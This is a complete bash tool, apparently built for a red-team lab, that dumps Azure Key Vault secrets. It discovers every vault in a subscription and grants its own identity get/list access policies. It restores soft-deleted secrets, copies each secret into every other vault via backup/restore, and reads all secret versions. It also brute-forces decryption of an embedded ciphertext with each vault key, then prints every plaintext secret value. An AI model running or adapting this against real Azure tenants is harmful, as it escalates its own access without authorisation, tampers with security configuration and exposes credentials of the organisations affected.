#!/usr/bin/env bash
# Harvest Azure Key Vault lab paths available to an Azure CLI identity. A
# caller-supplied Key Vault bearer token can replace the CLI identity only for
# data-plane requests; ARM and Graph require tokens with different audiences.

set -uo pipefail

readonly ARM_API='2021-04-01'
readonly VAULT_ARM_API='2023-07-01'
readonly KV_API='7.4'
readonly ARM_RESOURCE='https://management.azure.com/'
readonly GRAPH_RESOURCE='https://graph.microsoft.com/'
readonly KV_RESOURCE='https://vault.azure.net'
readonly LAB_CIPHERTEXT='pgtmi98FzXF8fmICKs9UfvOwS/iJ8oYbGt+j9uyccfOCzHmnse4dfFWrP+WSIJ4ZtXtp/MBXGhVkta1DMDBmA6WuUQ+7ZzadXDeWascBcyPBonX7MM2UqhUjZfSHxp+G+kgN1htZ4fflzgl5xt4UTkxW3keXnTiS6nPyTxdarUG7KB1XglRpTWZH11KG2nhETFlyfRENqU45f5YETsV8pUbotX474cuDgamwBZnDXoeqwSNOyiGmsA+sRAubTlpj7derQ0Leoa1s34LjtaJ+X42Sr6Q57SM0ZnJjDG01cWP78bHiet/4obrG+yXBlcnfaLBW2RHP5gO1aSKEelbPIw=='

die() { printf '[!] %s\n' "$*" >&2; exit 1; }
info() { printf '[*] %s\n' "$*" >&2; }
change() { printf '[change] %s\n' "$*" >&2; }

usage() {
    cat <<'EOF'
Usage: azkeyvaultenumerator.sh [--token <key-vault-bearer-token>] [--vault <name-or-url> ...]

Without --token, all requests use the current Azure CLI session.
With --token, Key Vault data-plane requests use the supplied bearer token;
ARM and Graph discovery continue to use the current Azure CLI session.

Supply --vault one or more times to skip ARM/Graph discovery. In that mode,
--token is required and an Azure CLI login is not needed. A vault may be a
short name or an https://<name>.vault.azure.net URL. The token is never printed
or written to disk.
EOF
}

KV_BEARER_TOKEN=''
DIRECT_VAULTS=()
while [[ $# -gt 0 ]]; do
    case "$1" in
        --token)
            [[ $# -ge 2 && -n "${2:-}" ]] || die '--token requires a bearer token value'
            KV_BEARER_TOKEN="$2"
            shift 2
            ;;
        --token=*)
            KV_BEARER_TOKEN="${1#*=}"
            [[ -n "$KV_BEARER_TOKEN" ]] || die '--token requires a bearer token value'
            shift
            ;;
        --vault)
            [[ $# -ge 2 && -n "${2:-}" ]] || die '--vault requires a vault name or URL'
            DIRECT_VAULTS+=("$2")
            shift 2
            ;;
        --vault=*)
            direct_vault="${1#*=}"
            [[ -n "$direct_vault" ]] || die '--vault requires a vault name or URL'
            DIRECT_VAULTS+=("$direct_vault")
            shift
            ;;
        -h|--help)
            usage
            exit 0
            ;;
        *) die "unknown argument: $1 (use --help)" ;;
    esac
done

# Accept a conventional Authorization header value without changing a raw JWT.
KV_BEARER_TOKEN="${KV_BEARER_TOKEN#Bearer }"
KV_BEARER_TOKEN="${KV_BEARER_TOKEN#bearer }"

for required in jq base64; do
    command -v "$required" >/dev/null 2>&1 || die "$required is required"
done
[[ -z "$KV_BEARER_TOKEN" ]] || command -v curl >/dev/null 2>&1 || die 'curl is required with --token'
if ((${#DIRECT_VAULTS[@]})); then
    [[ -n "$KV_BEARER_TOKEN" ]] || die '--vault requires --token'
else
    command -v az >/dev/null 2>&1 || die 'az is required unless --vault and --token are supplied'
fi

TASK_TMP="$(mktemp -d)" || die 'could not create a temporary directory'
cleanup() {
    if [[ -n "${TASK_TMP:-}" && -d "$TASK_TMP" && "$TASK_TMP" == /tmp/* ]]; then
        rm -rf -- "$TASK_TMP"
    fi
}
trap cleanup EXIT HUP INT TERM

RESULTS="$TASK_TMP/results.ndjson"
RECOVERED_MAP="$TASK_TMP/recovered.ndjson"
BACKUP_MAP="$TASK_TMP/backups.ndjson"
POLICY_CHANGED=0
mkdir -p "$TASK_TMP/active"
: >"$RESULTS"
: >"$RECOVERED_MAP"
: >"$BACKUP_MAP"

rest_call() {
    local method="$1" url="$2" resource="${3:-}" body="${4:-}"
    # Bearer tokens are audience-bound. Never send a Key Vault token to ARM or
    # Graph, and never print or persist it.
    if [[ -n "$KV_BEARER_TOKEN" && "$resource" == "$KV_RESOURCE" ]]; then
        local curl_args=(curl --silent --show-error --fail-with-body --request "$method" \
            --header "Authorization: Bearer ${KV_BEARER_TOKEN}" \
            --header 'Accept: application/json' --url "$url")
        [[ -z "$body" ]] || curl_args+=(--header 'Content-Type: application/json' --data "$body")
        "${curl_args[@]}"
        return
    fi
    local args=(az rest --only-show-errors --method "$method" --url "$url" -o json)
    [[ -z "$resource" ]] || args+=(--resource "$resource")
    [[ -z "$body" ]] || args+=(--body "$body")
    "${args[@]}" 2>/dev/null
}

collect_pages() {
    local next_url="$1" resource="${2:-}" page items combined='[]'
    while [[ -n "$next_url" ]]; do
        page="$(rest_call get "$next_url" "$resource")" || return 1
        items="$(jq -c '.value // []' <<<"$page")" || return 1
        combined="$(jq -cn --argjson left "$combined" --argjson right "$items" '$left + $right')" || return 1
        next_url="$(jq -r '.nextLink // ."@odata.nextLink" // empty' <<<"$page")"
    done
    printf '%s\n' "$combined"
}

kv_collect_with_retry() {
    local url="$1" attempt result attempts=1
    ((POLICY_CHANGED)) && attempts=4
    for ((attempt = 1; attempt <= attempts; attempt++)); do
        if result="$(collect_pages "$url" "$KV_RESOURCE")"; then
            printf '%s\n' "$result"
            return 0
        fi
        ((attempt == attempts)) || sleep 2
    done
    return 1
}

record_result() {
    local vault="$1" value="$2" source="$3" state="$4" object="$5" detail="$6"
    jq -cn --arg vault "$vault" --arg value "$value" --arg source "$source" \
        --arg state "$state" --arg object "$object" --arg detail "$detail" \
        '{vault:$vault,value:$value,source:$source,state:$state,object:$object,detail:$detail}' >>"$RESULTS"
}

resolve_object_id() {
    local principal_type="$1" principal_name="$2" encoded response object_id=''
    case "$principal_type" in
        servicePrincipal)
            encoded="$(jq -rn --arg value "$principal_name" '$value | @uri')"
            response="$(rest_call get "https://graph.microsoft.com/v1.0/servicePrincipals?%24filter=appId%20eq%20%27${encoded}%27&%24select=id" "$GRAPH_RESOURCE" || true)"
            object_id="$(jq -r '.value[0].id // empty' <<<"${response:-{}}" 2>/dev/null || true)"
            [[ -n "$object_id" ]] || object_id="$(az ad sp show --id "$principal_name" --query id -o tsv 2>/dev/null || true)"
            ;;
        user)
            response="$(rest_call get 'https://graph.microsoft.com/v1.0/me?%24select=id' "$GRAPH_RESOURCE" || true)"
            object_id="$(jq -r '.id // empty' <<<"${response:-{}}" 2>/dev/null || true)"
            [[ -n "$object_id" ]] || object_id="$(az ad signed-in-user show --query id -o tsv 2>/dev/null || true)"
            ;;
    esac
    printf '%s\n' "$object_id"
}

ensure_secret_read_policy() {
    local vault_json="$1" vault_id rbac policy have_get have_list body response effective
    vault_id="$(jq -r '.id' <<<"$vault_json")"
    rbac="$(jq -r '.properties.enableRbacAuthorization // false' <<<"$vault_json")"
    [[ "$rbac" != true && -n "$OBJECT_ID" ]] || return 0
    policy="$(jq -c --arg oid "${OBJECT_ID,,}" '[.properties.accessPolicies[]? | select((.objectId | ascii_downcase) == $oid)] | first // {}' <<<"$vault_json")"
    have_get="$(jq -r '[.permissions.secrets[]? | ascii_downcase] | index("get") != null' <<<"$policy")"
    have_list="$(jq -r '[.permissions.secrets[]? | ascii_downcase] | index("list") != null' <<<"$policy")"
    [[ "$have_get" == true && "$have_list" == true ]] && return 0

    body="$(jq -cn --argjson policy "$policy" --arg tenant "$TENANT_ID" --arg oid "$OBJECT_ID" '
      {properties:{accessPolicies:[{
        tenantId:($policy.tenantId // $tenant), objectId:$oid,
        permissions:{
          keys:($policy.permissions.keys // []),
          secrets:((($policy.permissions.secrets // []) + ["get","list"]) | unique_by(ascii_downcase)),
          certificates:($policy.permissions.certificates // []), storage:($policy.permissions.storage // [])
        }
      }]}}
    ')"
    response="$(rest_call put "https://management.azure.com${vault_id}/accessPolicies/add?api-version=${VAULT_ARM_API}" "$ARM_RESOURCE" "$body")" || return 0
    POLICY_CHANGED=1
    effective="$(jq -r '[.properties.accessPolicies[0].permissions.secrets[]?] | join(",")' <<<"$response")"
    change "PUT ${vault_id}/accessPolicies/add api-version=${VAULT_ARM_API} result=success responsePermissions=${effective:-unknown} objectId=${OBJECT_ID}"
}

recover_deleted() {
    local vault_json="$1" vault_name vault_uri deleted item name encoded response recovered_id attempt
    vault_name="$(jq -r '.name' <<<"$vault_json")"
    vault_uri="$(jq -r '.properties.vaultUri' <<<"$vault_json")"
    deleted="$(collect_pages "${vault_uri}deletedsecrets?api-version=${KV_API}" "$KV_RESOURCE")" || return 0
    while IFS= read -r item; do
        name="$(jq -r '.name // (.id | split("/")[-1])' <<<"$item")"
        [[ -n "$name" && "$name" != null ]] || continue
        encoded="$(jq -rn --arg value "$name" '$value | @uri')"
        response="$(rest_call post "${vault_uri}deletedsecrets/${encoded}/recover?api-version=${KV_API}" "$KV_RESOURCE")" || continue
        recovered_id="$(jq -r '.id // empty' <<<"$response")"
        change "POST ${vault_uri}deletedsecrets/${name}/recover api-version=${KV_API} result=success responseId=${recovered_id:-pending}"
        jq -cn --arg vault "$vault_name" --arg name "$name" '{vault:$vault,name:$name}' >>"$RECOVERED_MAP"
        for attempt in 1 2 3 4 5 6 7 8 9 10; do
            rest_call get "${vault_uri}secrets/${encoded}?api-version=${KV_API}" "$KV_RESOURCE" >/dev/null && break
            ((attempt == 10)) || sleep 1
        done
    done < <(jq -c '.[]' <<<"$deleted")
}

snapshot_active_secrets() {
    local vault_json="$1" vault_name vault_uri active
    vault_name="$(jq -r '.name' <<<"$vault_json")"
    vault_uri="$(jq -r '.properties.vaultUri' <<<"$vault_json")"
    active="$(kv_collect_with_retry "${vault_uri}secrets?api-version=${KV_API}")" || active='[]'
    printf '%s\n' "$active" >"$TASK_TMP/active/${vault_name}.json"
}

backup_and_restore() {
    local source_json="$1" source_name source_uri source_item secret_name encoded backup blob
    local target_json target_name target_uri body restored restored_id
    source_name="$(jq -r '.name' <<<"$source_json")"
    source_uri="$(jq -r '.properties.vaultUri' <<<"$source_json")"
    while IFS= read -r source_item; do
        secret_name="$(jq -r '.id | split("/")[-1]' <<<"$source_item")"
        [[ -n "$secret_name" && "$secret_name" != null ]] || continue
        encoded="$(jq -rn --arg value "$secret_name" '$value | @uri')"
        backup="$(rest_call post "${source_uri}secrets/${encoded}/backup?api-version=${KV_API}" "$KV_RESOURCE")" || continue
        blob="$(jq -r '.value // empty' <<<"$backup")"
        [[ -n "$blob" ]] || continue
        change "POST ${source_uri}secrets/${secret_name}/backup api-version=${KV_API} result=backup-created-in-memory"
        body="$(jq -cn --arg value "$blob" '{value:$value}')"
        while IFS= read -r target_json; do
            target_name="$(jq -r '.name' <<<"$target_json")"
            [[ "$target_name" != "$source_name" ]] || continue
            target_uri="$(jq -r '.properties.vaultUri' <<<"$target_json")"
            restored="$(rest_call post "${target_uri}secrets/restore?api-version=${KV_API}" "$KV_RESOURCE" "$body")" || continue
            restored_id="$(jq -r '.id // empty' <<<"$restored")"
            change "POST ${target_uri}secrets/restore api-version=${KV_API} result=success responseId=${restored_id:-unknown} source=${source_name}/${secret_name}"
            jq -cn --arg vault "$target_name" --arg name "$secret_name" --arg sourceVault "$source_name" \
                '{vault:$vault,name:$name,sourceVault:$sourceVault}' >>"$BACKUP_MAP"
        done < <(jq -c '.[]' <<<"$VAULTS")
    done < <(jq -c '.[]' "$TASK_TMP/active/${source_name}.json")
}

classify_secret() {
    local vault="$1" name="$2" is_latest="$3" backup_source recovered
    backup_source="$(jq -r --arg vault "$vault" --arg name "$name" 'select(.vault == $vault and .name == $name) | .sourceVault' "$BACKUP_MAP" 2>/dev/null | head -n1)"
    if [[ -n "$backup_source" ]]; then
        CLASS_SOURCE="backup:${backup_source}/${name}"
        CLASS_STATE='backup-restored'
        return
    fi
    recovered="$(jq -r --arg vault "$vault" --arg name "$name" 'select(.vault == $vault and .name == $name) | .name' "$RECOVERED_MAP" 2>/dev/null | head -n1)"
    if [[ -n "$recovered" ]]; then
        CLASS_SOURCE="deleted:${vault}/${name}"
        CLASS_STATE='recovered'
        return
    fi
    CLASS_SOURCE="data-plane:${vault}/${name}"
    [[ "$is_latest" == true ]] && CLASS_STATE='live-latest' || CLASS_STATE='live-old-version'
}

read_all_secret_versions() {
    local vault_json="$1" vault_name vault_uri active secret_item name encoded versions latest_id
    local version_item version_id bundle value version is_latest
    vault_name="$(jq -r '.name' <<<"$vault_json")"
    vault_uri="$(jq -r '.properties.vaultUri' <<<"$vault_json")"
    active="$(kv_collect_with_retry "${vault_uri}secrets?api-version=${KV_API}")" || return 0
    while IFS= read -r secret_item; do
        name="$(jq -r '.id | split("/")[-1]' <<<"$secret_item")"
        encoded="$(jq -rn --arg value "$name" '$value | @uri')"
        versions="$(kv_collect_with_retry "${vault_uri}secrets/${encoded}/versions?api-version=${KV_API}")" || versions='[]'
        if [[ "$(jq 'length' <<<"$versions")" -eq 0 ]]; then
            versions="$(jq -cn --arg id "${vault_uri}secrets/${encoded}" '[{id:$id,attributes:{created:0}}]')"
        fi
        latest_id="$(jq -r 'sort_by(.attributes.created // 0) | last | .id' <<<"$versions")"
        while IFS= read -r version_item; do
            version_id="$(jq -r '.id' <<<"$version_item")"
            bundle="$(rest_call get "${version_id}?api-version=${KV_API}" "$KV_RESOURCE")" || continue
            value="$(jq -r '.value // ""' <<<"$bundle")"
            version="$(jq -r '.id | split("/")[-1]' <<<"$bundle")"
            [[ "$version_id" == "$latest_id" ]] && is_latest=true || is_latest=false
            classify_secret "$vault_name" "$name" "$is_latest"
            record_result "$vault_name" "$value" "$CLASS_SOURCE" "$CLASS_STATE" "$name" "$version"
        done < <(jq -c '.[]' <<<"$versions")
    done < <(jq -c '.[]' <<<"$active")
}

base64_to_base64url() { printf '%s' "$1" | tr '+/' '-_' | tr -d '=\n'; }
base64url_decode() {
    local value="$1" padding
    value="${value//-/+}"
    value="${value//_/\/}"
    case $((${#value} % 4)) in 2) padding='==' ;; 3) padding='=' ;; *) padding='' ;; esac
    printf '%s%s' "$value" "$padding" | base64 --decode 2>/dev/null
}

validate_kv_bearer_token() {
    local header payload signature claims audience expires_at now
    [[ -n "$KV_BEARER_TOKEN" ]] || return 0
    IFS='.' read -r header payload signature <<<"$KV_BEARER_TOKEN"
    [[ -n "$header" && -n "$payload" && -n "$signature" ]] || die '--token must be a JWT access token issued for Key Vault'
    claims="$(base64url_decode "$payload")" || die '--token has an unreadable JWT payload'
    jq -e . >/dev/null 2>&1 <<<"$claims" || die '--token has an invalid JWT payload'
    audience="$(jq -r '.aud // empty' <<<"$claims")"
    case "$audience" in
        https://vault.azure.net|https://vault.azure.net/|cfa8b339-82a2-471a-a3c9-0fc0be7a4093) ;;
        https://management.azure.com|https://management.azure.com/)
            die '--token is an Azure Resource Manager token; obtain a Key Vault token for https://vault.azure.net'
            ;;
        *) die "--token audience is ${audience:-missing}; expected the Azure Key Vault audience" ;;
    esac
    expires_at="$(jq -r '.exp // empty' <<<"$claims")"
    now="$(date +%s)"
    [[ "$expires_at" =~ ^[0-9]+$ && "$expires_at" -gt "$now" ]] || die '--token is expired or has no usable exp claim'
}

build_direct_vaults() {
    local supplied uri host name vaults='[]'
    for supplied in "${DIRECT_VAULTS[@]}"; do
        if [[ "$supplied" == https://* ]]; then
            uri="${supplied%/}/"
            host="${uri#https://}"
            host="${host%%/*}"
            [[ "$host" == *.vault.azure.net ]] || die "unsupported Key Vault URL: $supplied"
            name="${host%%.vault.azure.net}"
        else
            [[ "$supplied" =~ ^[A-Za-z0-9-]+$ ]] || die "invalid Key Vault name: $supplied"
            name="$supplied"
            uri="https://${name}.vault.azure.net/"
        fi
        vaults="$(jq -cn --argjson current "$vaults" --arg name "$name" --arg uri "$uri" \
            '$current + [{name:$name,properties:{vaultUri:$uri,enableRbacAuthorization:true}}]')"
    done
    printf '%s\n' "$vaults"
}

decrypt_lab_ciphertext() {
    local vault_json="$1" vault_name vault_uri keys key_item key_name encoded versions version_item key_id
    local algorithm body response plaintext ciphertext_url
    vault_name="$(jq -r '.name' <<<"$vault_json")"
    vault_uri="$(jq -r '.properties.vaultUri' <<<"$vault_json")"
    keys="$(collect_pages "${vault_uri}keys?api-version=${KV_API}" "$KV_RESOURCE")" || return 0
    ciphertext_url="$(base64_to_base64url "$LAB_CIPHERTEXT")"
    while IFS= read -r key_item; do
        key_name="$(jq -r '.kid | split("/")[-1]' <<<"$key_item")"
        encoded="$(jq -rn --arg value "$key_name" '$value | @uri')"
        versions="$(collect_pages "${vault_uri}keys/${encoded}/versions?api-version=${KV_API}" "$KV_RESOURCE")" || versions='[]'
        if [[ "$(jq 'length' <<<"$versions")" -eq 0 ]]; then
            versions="$(jq -cn --arg kid "$(jq -r '.kid' <<<"$key_item")" '[{kid:$kid}]')"
        fi
        while IFS= read -r version_item; do
            key_id="$(jq -r '.kid' <<<"$version_item")"
            for algorithm in RSA-OAEP RSA-OAEP-256 RSA1_5; do
                body="$(jq -cn --arg alg "$algorithm" --arg value "$ciphertext_url" '{alg:$alg,value:$value}')"
                response="$(rest_call post "${key_id}/decrypt?api-version=${KV_API}" "$KV_RESOURCE" "$body")" || continue
                plaintext="$(base64url_decode "$(jq -r '.value // empty' <<<"$response")")" || continue
                [[ -n "$plaintext" ]] || continue
                record_result "$vault_name" "$plaintext" 'embedded-lab-ciphertext' 'decrypted' "$key_name" "$algorithm"
                return 0
            done
        done < <(jq -c '.[]' <<<"$versions")
    done < <(jq -c '.[]' <<<"$keys")
}

print_table() {
    local rows
    rows="$(jq -sc 'unique_by([.vault,.value,.source,.state,.object,.detail]) | sort_by(.vault,.object,.state,.detail)' "$RESULTS")"
    if [[ "$(jq 'length' <<<"$rows")" -eq 0 ]]; then
        printf 'No readable secret values or decryptable ciphertext were found.\n'
        return
    fi
    jq -r '(["KEY_VAULT","SECRET_VALUE","SOURCE","STATE","SECRET_OR_KEY","VERSION_OR_ALGORITHM"] | @tsv),
      (.[] | [.vault,.value,.source,.state,.object,.detail] | @tsv)' <<<"$rows" |
        if command -v column >/dev/null 2>&1; then column -t -s $'\t'; else cat; fi
}

validate_kv_bearer_token
if ((${#DIRECT_VAULTS[@]})); then
    token_claims="$(base64url_decode "$(cut -d. -f2 <<<"$KV_BEARER_TOKEN")")"
    CONTEXT="$(jq -cn --arg tenant "$(jq -r '.tid // "unknown"' <<<"$token_claims")" \
        --arg principal "$(jq -r '.appid // .oid // "unknown"' <<<"$token_claims")" \
        '{subscription:"direct-vault",tenant:$tenant,principal:$principal,principalType:"managedIdentity"}')"
else
    CONTEXT="$(az account show --query '{subscription:id,tenant:tenantId,principal:user.name,principalType:user.type}' -o json 2>/dev/null)" || die 'no active Azure CLI login; authenticate first'
fi
SUBSCRIPTION_ID="$(jq -r '.subscription' <<<"$CONTEXT")"
TENANT_ID="$(jq -r '.tenant' <<<"$CONTEXT")"
PRINCIPAL_NAME="$(jq -r '.principal' <<<"$CONTEXT")"
PRINCIPAL_TYPE="$(jq -r '.principalType' <<<"$CONTEXT")"
[[ -n "$SUBSCRIPTION_ID" && "$SUBSCRIPTION_ID" != null ]] || die 'the current login has no active subscription'
if ((${#DIRECT_VAULTS[@]})); then OBJECT_ID=''; else OBJECT_ID="$(resolve_object_id "$PRINCIPAL_TYPE" "$PRINCIPAL_NAME")"; fi
info "subscription=${SUBSCRIPTION_ID} tenant=${TENANT_ID} identity=${PRINCIPAL_TYPE}:${PRINCIPAL_NAME} objectId=${OBJECT_ID:-unresolved}"

if ((${#DIRECT_VAULTS[@]})); then
    VAULTS="$(build_direct_vaults)"
else
    RESOURCE_URL="https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resources?api-version=${ARM_API}"
    RESOURCES="$(collect_pages "$RESOURCE_URL" "$ARM_RESOURCE")" || die 'could not enumerate subscription resources through ARM'
    VAULT_REFS="$(jq -c '[.[] | select((.type | ascii_downcase) == "microsoft.keyvault/vaults")]' <<<"$RESOURCES")"
    VAULT_DETAILS="$TASK_TMP/vaults.ndjson"
    : >"$VAULT_DETAILS"
    while IFS= read -r vault_ref; do
        vault_id="$(jq -r '.id' <<<"$vault_ref")"
        vault_detail="$(rest_call get "https://management.azure.com${vault_id}?api-version=${VAULT_ARM_API}" "$ARM_RESOURCE")" || continue
        printf '%s\n' "$vault_detail" >>"$VAULT_DETAILS"
    done < <(jq -c '.[]' <<<"$VAULT_REFS")
    VAULTS="$(jq -sc 'sort_by(.name)' "$VAULT_DETAILS")"
fi
[[ "$(jq 'length' <<<"$VAULTS")" -gt 0 ]] || die 'no Key Vault resources were visible to the current identity'
info "discovered $(jq 'length' <<<"$VAULTS") vault(s)"

while IFS= read -r vault_json; do ensure_secret_read_policy "$vault_json"; done < <(jq -c '.[]' <<<"$VAULTS")
while IFS= read -r vault_json; do
    recover_deleted "$vault_json"
    snapshot_active_secrets "$vault_json"
done < <(jq -c '.[]' <<<"$VAULTS")
while IFS= read -r vault_json; do backup_and_restore "$vault_json"; done < <(jq -c '.[]' <<<"$VAULTS")
while IFS= read -r vault_json; do
    read_all_secret_versions "$vault_json"
    decrypt_lab_ciphertext "$vault_json"
done < <(jq -c '.[]' <<<"$VAULTS")
print_table
